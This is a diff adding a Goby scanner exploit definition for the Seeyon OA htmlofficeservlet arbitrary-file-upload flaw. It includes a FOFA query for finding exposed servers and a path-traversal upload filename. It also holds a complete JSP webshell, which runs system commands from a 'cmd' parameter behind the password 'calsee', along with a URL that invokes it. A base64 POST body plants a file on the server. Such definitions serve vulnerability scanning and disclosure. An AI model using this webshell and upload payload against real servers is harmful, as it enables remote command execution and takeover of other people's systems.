@@ -1,0 +1,98 @@
+{
+  "Name": "致远OA htmlofficeservlet文件上传getshell",
+  "Description": "致远是从事OA办公自动化软件的开发销售与服务工作，致远OA在国内使用广泛。该漏洞可造成任意文件上传，恶意攻击者通过精心构造POST数据来上传JSP Webshell，提升服务器权限，从而控制服务器或对系统造成破坏。",
+  "Product": "致远OA-A8",
+  "Homepage": "http://support.seeyon.com/",
+  "DisclosureDate": "2020-08-06",
+  "Author": "gobysec@gmail.com",
+  "GifAddress": "https://raw.githubusercontent.com/gobysec/GobyVuls/master/Seeyon/htmlofficeservlet_uploadfile_getshell/zhiyuan_htmlofficeservlet_getshell.gif",
+  "FofaQuery": "app=\"致远互联-OA\" || app=\"Seeyon-Server\"|| app=\"用友-致远OA\" || (server=\"Seeyon-Server\") || (body=\"/seeyon/USER-DATA/IMAGES/LOGIN/login.gif\" || title=\"用友致远A\" || body=\"/yyoa/\" || header=\"path=/yyoa\" || server==\"SY8044\" || (body=\"A6-V5企业版\" && body=\"seeyon\" && body=\"seeyonProductId\") || (body=\"/seeyon/common/\" && body=\"var _ctxpath = '/seeyon'\") || (body=\"A8-V5企业版\" && body=\"/seeyon/\"))",
+  "Level": "3",
+  "Impact": "恶意攻击者通过精心构造POST数据来上传JSP Webshell，提升服务器权限，受影响的范围有：致远A8-V5协同管理软件 V6.1sp1，致远A8+协同管理软件",
+  "Recommendation": "官网下载补丁更新。",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+	{
+      "Name": "filename",
+      "Type": "input",
+      "Value": "..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\testtesta.jsp"
+    },
+    {
+      "Name": "payload",
+      "Type": "input",
+		"Value": "<%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"calsee\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>>a6e4f045d4b8506bf492ada7e3390d7ce"
+    },
+	{
+      "Name": "shellfileUrl",
+      "Type": "input",
+      "Value": "/seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+		"data": "REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkTjFsaU5yd0VxSE91Tmc2Ng0KbmVlZFJlYWRGaWxlPXlSV1pkQVM2DQpvcmlnaW5hbENyZWF0ZURhdGU9d0xTR1A0b0V6TEtBejQ9aXo9NjYNCmFzZGZ0ZXN0czI2ZTRmMDQ1ZDRiODUwNmJmNDkyYWRhN2UzMzkwZDdjZQ==",
+        "data_type": "base64",
+        "follow_redirect": false,
+        "method": "POST",
+        "uri": "/seeyon/htmlofficeservlet"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "OPTION=S3WYOSWLBSGr",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      },
+      "SetVariable": []
+    },
+	{
+      "Request": {
+        "data":"",
+		"data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+        "uri": "/seeyon/tests7.txt"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "test",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["getshell"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["Seeyon-Server"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
